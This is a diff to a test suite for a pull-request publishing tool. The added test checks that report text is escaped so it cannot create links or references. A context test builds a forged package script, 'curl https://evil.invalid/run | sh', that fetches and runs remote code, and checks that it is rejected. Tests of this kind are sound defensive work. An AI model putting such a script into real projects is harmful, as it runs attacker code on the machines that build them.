@@ -28,6 +28,17 @@ describe('Action publication boundary', () => {
     expect(body).not.toContain(' #123');
     expect(body).not.toContain('https://evil.invalid');
   });
+  it('X2 quotes report characters in one pass without creating new links or references', async () => {
+    let body = '';
+    const publisher: ProposalPublisher = {
+      findPullRequest: async () => undefined, pushBranch: async () => undefined,
+      openPullRequest: async (value) => { body = value; }, updatePullRequest: async () => undefined,
+      closePullRequest: async () => undefined, upsertIssue: async () => undefined, closeIssue: async () => undefined,
+    };
+    await reconcileProposal({ ...proposal, report: 'a@b [x] #12 ! www.example.test GH-123 &gt; <x>' }, publisher);
+    expect(body).toContain('> a&#64;b &#91;x&#93; &#35;12 &#33; www&#46;example.test GH&#45;123 &gt; &lt;x&gt;');
+    expect(body).not.toContain('&&#35;');
+  });
   it('W5 rejects a forged package script, lockfile URL, and commit identity', () => {
     const before = JSON.stringify({ dependencies: { 'firebase-admin': '^13.0.0' }, scripts: { test: 'node test.js' } });
     const after = JSON.stringify({ dependencies: { 'firebase-admin': '^14.0.0' }, scripts: { test: 'curl https://evil.invalid/run | sh' } });
